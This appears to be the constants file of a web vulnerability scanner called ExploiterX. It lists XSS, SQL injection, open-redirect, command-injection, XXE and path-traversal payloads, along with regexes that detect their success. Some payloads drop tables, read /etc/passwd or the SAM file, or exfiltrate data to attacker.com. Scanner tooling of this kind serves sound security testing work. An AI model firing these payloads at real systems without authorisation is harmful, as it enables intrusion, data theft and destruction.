"""
Constants and payload definitions for ExploiterX.

Contains vulnerability payloads, error patterns, and security indicators.
"""

from typing import List, Dict

# ============================================================================
# XSS (Cross-Site Scripting) PAYLOADS
# ============================================================================

XSS_PAYLOADS: List[str] = [
    # Basic script injection
    "<script>alert('XSS')</script>",
    "<script>alert(\"XSS\")</script>",
    "<script>console.log('XSS')</script>",
    
    # Event handler variants
    "<img src=x onerror=\"alert('XSS')\">",
    "<img src=x onerror='alert(1)'>",
    "<svg onload=\"alert('XSS')\">",
    "<body onload=\"alert('XSS')\">",
    "<input onfocus=\"alert('XSS')\" autofocus>",
    
    # DOM-based variants
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
    
    # Protocol handlers
    "<a href=\"javascript:alert('XSS')\">click</a>",
    "<form action=\"javascript:alert('XSS')\">",
    
    # Data attributes
    "<div data-value=\"\"><script>alert('XSS')</script>",
    
    # Style/CSS injection
    "<style>@import 'javascript:alert(\"XSS\")';</style>",
    "<div style=\"background:url('javascript:alert(1)')\">",
    
    # HTML5 variants
    "<video src=x onerror=\"alert('XSS')\">",
    "<audio src=x onerror=\"alert('XSS')\">",
    
    # Character encoding bypasses
    "<img src=x &#111;nerror=\"alert('XSS')\">",
    "<img src=x &#x6f;nerror=\"alert('XSS')\">",
    
    # Additional variants
    "<marquee onstart=\"alert('XSS')\">",
    "<details open ontoggle=\"alert('XSS')\">",
]

# ============================================================================
# SQL INJECTION PAYLOADS
# ============================================================================

SQLI_PAYLOADS: List[str] = [
    # Boolean-based blind SQLi
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    
    # Time-based blind SQLi (early so it's exercised in the default 5-payload pass)
    "' OR SLEEP(5)--",
    
    "admin' --",
    "admin' #",
    "admin'/*",
    
    # Additional time-based blind SQLi
    "'; WAITFOR DELAY '00:00:05'--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    
    # Union-based SQLi
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL--",
    
    # Error-based SQLi
    "' AND extractvalue(0x0a,concat(0x3a,version()))--",
    "' AND updatexml(0x0a,concat(0x3a,(select version())),0x0a)--",
    
    # Stacked queries
    "'; DROP TABLE users--",
    "'; SELECT * FROM users--",
    
    # Alternative quote styles
    "\" OR \"1\"=\"1",
    "` OR `1`=`1",
]

# ============================================================================
# OPEN REDIRECT PAYLOADS
# ============================================================================

OPEN_REDIRECT_PAYLOADS: List[str] = [
    # Protocol-relative and absolute URLs
    "//evil.com",
    "https://evil.com",
    "http://evil.com",
    "https:evil.com",
    "///evil.com",
    
    # Backslash bypass variants
    "/\\evil.com",
    "//\\evil.com",
    "https:/\\evil.com",
    
    # Encoded variants
    "%2f%2fevil.com",
    "%2f%5cevil.com",
    "https://evil.com/%2f..",
    
    # Whitespace / control char tricks
    "/ /evil.com",
    "/%09/evil.com",
    "//evil.com/%2e%2e",
]

# Marker domain used to confirm the redirect payload was reflected
OPEN_REDIRECT_MARKER: str = "evil.com"

# HTTP status codes that indicate a redirect
REDIRECT_STATUS_CODES: tuple = (301, 302, 303, 307, 308)

# ============================================================================
# COMMAND INJECTION PAYLOADS
# ============================================================================

COMMAND_INJECTION_PAYLOADS: List[str] = [
    # Basic command execution
    "; id",
    "| id",
    "& id",
    "&& id",
    
    # Time-based (blind) command injection (early so it's exercised in the
    # default 5-payload pass)
    "; sleep 3",
    
    "; ls -la",
    "| whoami",
    "$(id)",
    "`id`",
    "; uname -a",
    "| cat /etc/passwd",
    
    # Time-based (blind) command injection
    "; sleep 3",
    "| sleep 3",
    "$(sleep 3)",
    "`sleep 3`",
    "& ping -c 3 127.0.0.1 &",
    "& ping -n 3 127.0.0.1 &",
    
    # Windows variants
    "& dir",
    "| ver",
    "& ipconfig",
]

COMMAND_INJECTION_PATTERNS: List[str] = [
    # Unix command output
    r"uid=\d+\([^)]*\) gid=",
    r"root:x:0:0:",
    r"drwxr-xr-x",
    r"total \d+",
    r"\bwhoami\b",
    r"GNU/Linux",
    r"Linux version \d",
    
    # Windows command output
    r"Microsoft Windows \[Version",
    r"Windows IP Configuration",
    r"Volume in drive .* has no label",
    
    # Shell error indicators
    r"sh:\s*\w+:\s*not found",
    r"command not found",
    r"not recognized as an internal or external command",
    r"No such file or directory",
    r"/bin/sh:",
]

# Markers that indicate a payload is intended to cause a measurable delay
TIME_BASED_MARKERS: List[str] = [
    "SLEEP(",
    "WAITFOR DELAY",
    "PG_SLEEP",
    "BENCHMARK(",
    "SLEEP ",
    "PING -C",
    "PING -N",
]

# ============================================================================
# CSRF DETECTION PATTERNS
# ============================================================================

CSRF_INDICATORS: Dict[str, List[str]] = {
    "missing_tokens": [
        "csrf_token",
        "csrftoken",
        "_token",
        "__RequestVerificationToken",
        "authenticity_token",
        "token",
    ],
    "dangerous_methods": ["GET", "HEAD"],
    "unsafe_headers": [
        "Content-Type: application/x-www-form-urlencoded",
        "Content-Type: multipart/form-data",
        "Content-Type: text/plain",
    ]
}

# ============================================================================
# SECURITY HEADERS
# ============================================================================

SECURE_HEADERS: Dict[str, str] = {
    "Content-Security-Policy": "Should define CSP policy",
    "X-Frame-Options": "Should be DENY or SAMEORIGIN",
    "X-Content-Type-Options": "Should be nosniff",
    "Strict-Transport-Security": "Should enforce HSTS",
    "X-XSS-Protection": "Should be enabled",
    "Referrer-Policy": "Should be defined",
    "Permissions-Policy": "Should be configured",
}

# ============================================================================
# SQL ERROR PATTERNS
# ============================================================================

SQL_ERROR_PATTERNS: List[str] = [
    # MySQL
    "SQL syntax",
    "mysql_fetch",
    "Warning: mysql",
    "MySQL Error",
    "sql_error",
    
    # PostgreSQL
    "PostgreSQL",
    "psycopg2",
    "PGError",
    
    # MSSQL
    "Unclosed quotation mark",
    "Microsoft OLE DB",
    "OleDbException",
    "ODBC error",
    
    # Oracle
    "ORA-",
    "Oracle error",
    
    # SQLite
    "SQLite",
    "database is locked",
    
    # Generic
    "SQL command not properly ended",
    "statement cannot be prepared",
    "syntax error",
    "Parse error",
    "invalid column",
    "Table or column not found",
]

# ============================================================================
# HTTP RESPONSE CODES
# ============================================================================

HTTP_STATUS_CODES: Dict[int, str] = {
    200: "OK",
    201: "Created",
    204: "No Content",
    301: "Moved Permanently",
    302: "Found",
    304: "Not Modified",
    400: "Bad Request",
    401: "Unauthorized",
    403: "Forbidden",
    404: "Not Found",
    500: "Internal Server Error",
    502: "Bad Gateway",
    503: "Service Unavailable",
}

# ============================================================================
# VULNERABILITY SEVERITY LEVELS
# ============================================================================

SEVERITY_LEVELS: List[str] = [
    "critical",
    "high",
    "medium",
    "low",
    "info"
]

SEVERITY_SCORES: Dict[str, float] = {
    "critical": 9.0,
    "high": 7.0,
    "medium": 5.0,
    "low": 3.0,
    "info": 1.0,
}

# ============================================================================
# COMMON ENDPOINTS TO TEST
# ============================================================================

COMMON_ENDPOINTS: List[str] = [
    "/search",
    "/q",
    "/query",
    "/s",
    "/find",
    "/filter",
    "/page",
    "/id",
    "/user",
    "/product",
    "/article",
    "/post",
    "/comment",
    "/search.php",
    "/api/search",
]

# ============================================================================
# REQUEST CONFIGURATION
# ============================================================================

DEFAULT_USER_AGENT: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

COMMON_HEADERS: Dict[str, str] = {
    "User-Agent": DEFAULT_USER_AGENT,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "keep-alive",
}

# ============================================================================
# XML EXTERNAL ENTITY (XXE) INJECTION PAYLOADS
# ============================================================================

XXE_PAYLOADS: List[str] = [
    # Basic XXE - file read attempts
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///windows/win.ini">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    
    # PHP filter wrapper (for reading PHP source)
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">]><foo>&xxe;</foo>',
    
    # Blind XXE - out-of-band data exfiltration
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://attacker.com/exfil?data=">]><foo>&xxe;</foo>',
    
    # DTD external subset
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    
    # Billion laughs attack (XML bomb)
    '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol2;</lolz>',
    
    # Parameter entity XXE
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><foo/>'
]

XXE_ERROR_PATTERNS: List[str] = [
    # File read indicators (only appear when file contents are actually returned)
    r"root:.*:0:0:",  # /etc/passwd
    r"daemon:.*:1:1:",
    r"\[mail\]",  # win.ini
    r"\[isoem\]",
    r"drivers\=",

    # Parser rejections of DTDs/entities (real XXE error messages, kept
    # specific to avoid false positives from standard HTML DOCTYPE lines)
    r"DOCTYPE\s+is\s+disallowed",
    r"DTD\s+is\s+prohibited",
    r"disallow-doctype",
    r"external\s+entity",
    r"entity\s+is\s+prohibited",
    r"entity\s+expansion",
    r"parameter entity",
    r"entity\s*:\s*line",
    r"XML\s+declaration",
    r"XML\s+parser\s+error",
    r"XML_ERROR",
    r"SAXParseException",

    # Framework-specific indicators
    r"java\.io\.FileNotFoundException",
]

# ============================================================================
# PATH TRAVERSAL PAYLOADS
# ============================================================================

PATH_TRAVERSAL_PAYLOADS: List[str] = [
    # Unix/Linux payloads
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    
    # Windows payloads
    "..\\windows\\win.ini",
    "..\\..\\windows\\win.ini",
    "..\\..\\..\\windows\\win.ini",
    
    # URL encoded variants
    "..%2Fetc%2Fpasswd",
    "..%252Fetc%252Fpasswd",  # Double encoded
    "..%5c..%5cwindows%5cwin.ini",  # Windows encoded
    
    # Alternate separators
    "....//....//....//etc/passwd",
    "....\\\\....\\\\....\\\\windows\\\\win.ini",
    "..%252e%252fetc%252fpasswd",
    
    # Null byte injection (older systems)
    "../etc/passwd%00",
    "../etc/passwd%00.txt",
    
    # Case variation (bypass)
    "../ETC/PASSWD",
    "..\\Windows\\win.ini",
    
    # Mixed case and encoding
    "..\\..\\Windows\\System32\\config\\sam",
    "..\\..\\..\\boot.ini",
]

PATH_TRAVERSAL_PATTERNS: List[str] = [
    # Unix/Linux file contents
    r"root:.*:0:0:",  # /etc/passwd
    r"daemon:.*:1:1:",
    r"bin:.*:2:2:",
    
    # Windows file contents
    r"\[mail\]",  # win.ini
    r"\[isoem\]",
    r"drivers\=",
    r"shell\=",
    r"C:\=",
    
    # NOTE: generic error strings were deliberately removed from this list.
    # Patterns such as "403", "404", "not found", "access denied",
    # "permission denied" and "no such file" occur on ordinary pages, so
    # matching them flagged a Path Traversal (HIGH) on almost every response
    # (false positives). Detection now relies only on file-content signatures,
    # which actually prove a traversal.
]

# ============================================================================
# RESPONSE ANALYSIS PATTERNS
# ============================================================================

RESPONSE_PATTERNS: Dict[str, List[str]] = {
    "xss_patterns": [
        "<script>alert",
        "javascript:",
        "onerror=",
        "onload=",
        "onclick=",
    ],
    "sqli_patterns": SQL_ERROR_PATTERNS,
    "xxe_patterns": XXE_ERROR_PATTERNS,
    "path_traversal": PATH_TRAVERSAL_PATTERNS,
}

# ============================================================================
# SCAN CONFIGURATION DEFAULTS
# ============================================================================

DEFAULT_TIMEOUT: int = 10
DEFAULT_THREADS: int = 5
DEFAULT_RETRIES: int = 3
DEFAULT_DELAY: float = 0.5  # Delay between requests in seconds

# ============================================================================
# OUTPUT FORMATS
# ============================================================================

OUTPUT_FORMATS: List[str] = [
    "json",
    "csv",
    "html",
    "console"
]

# ============================================================================
# COMMON FORMS
# ============================================================================

FORM_INPUT_TYPES: List[str] = [
    "text",
    "search",
    "url",
    "email",
    "password",
    "number",
    "file",
    "hidden",
]
